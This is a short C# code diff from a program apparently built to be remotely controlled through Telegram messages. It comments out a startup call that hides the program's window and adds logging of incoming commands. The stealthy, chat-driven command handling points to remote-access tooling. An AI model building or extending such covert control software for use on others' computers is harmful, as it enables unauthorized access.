@@ -12,13 +12,15 @@ namespace ShadeControll
     {
         public static TelegramClient telegramClient;
         public static ConfigParser configFile;
+        public static Loger loger;
         public static readonly string configFileName = "config.cfg";
 
         static void Main()
         {
             // Preparing
-            Ninja.Hide();
+            //Ninja.Hide();
             configFile = GetConfig(configFileName);
+            loger = new Loger(configFile.GetValue("directories", "logs"));
             telegramClient = new TelegramClient(configFile.GetValue("info","key"));
             while(!telegramClient.Connect()) { Thread.Sleep(1000); }
 
@@ -45,6 +47,7 @@ namespace ShadeControll
         // Lister Telegram Client Commands
         private static void Client_NewMessage(string message)
         {
+            loger.Log("<<" + message + Environment.NewLine);
             Cmd _cmd = new Cmd(message);
             foreach(Command cmd in Command.AvailableCommands)
             {
